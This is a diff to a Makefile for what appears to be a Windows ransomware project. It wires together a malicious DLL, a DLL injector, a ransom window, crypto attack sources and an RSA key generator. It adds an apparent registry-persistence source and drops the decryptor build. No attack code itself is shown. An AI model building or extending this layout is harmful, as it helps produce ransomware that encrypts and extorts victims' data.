@@ -26,24 +26,24 @@ LDFLAGS = -static -static-libgcc -static-libstdc++ \
 # Shared sources
 SHARED_SRC = \
     $(SRC_DIR)/get_relative_path.c \
+    $(SRC_DIR)/store_in_register.c \
     $(SRC_DIR)/attack.c \
     $(SRC_DIR)/attack_crypto.c \
     $(SRC_DIR)/attack_web.c \
     $(SRC_DIR)/attack_decrypt.c  \
     $(SRC_DIR)/read_files.c
+    
 
 RANSOM_WINDOW_SRC = $(SRC_DIR)/ransom_window.c 
 
 # Per-target sources
 DLL_SRC       = $(SRC_DIR)/bad_dll.c $(SHARED_SRC)
 INJECTOR_SRC  = $(SRC_DIR)/dll_injector.c $(SHARED_SRC) $(RANSOM_WINDOW_SRC)
-DECRYPT_SRC   = $(SRC_DIR)/decrypt.c $(SHARED_SRC)
 GENERATE_RSA_SRC = $(SRC_DIR)/generate_rsa.c
 
 # Targets
 BAD_DLL      = $(BUILD_DIR)/bad_dll.dll
 INJECTOR_EXE = $(BUILD_DIR)/dll_injector.exe
-DECRYPT_EXE  = $(BUILD_DIR)/decrypt.exe
 RSA_EXE      = $(BUILD_DIR)/generate_rsa.exe
 
 # Default target
@@ -60,9 +60,6 @@ $(BAD_DLL): $(DLL_SRC) | $(BUILD_DIR)
 # EXEs
 $(INJECTOR_EXE): $(INJECTOR_SRC) | $(BUILD_DIR)
 	$(CC) $(CFLAGS) -o  $@ $^ -mwindows $(LDFLAGS)
-
-$(DECRYPT_EXE): $(DECRYPT_SRC) | $(BUILD_DIR)
-	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
 
 $(RSA_EXE): $(GENERATE_RSA_SRC) | $(BUILD_DIR)
 	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
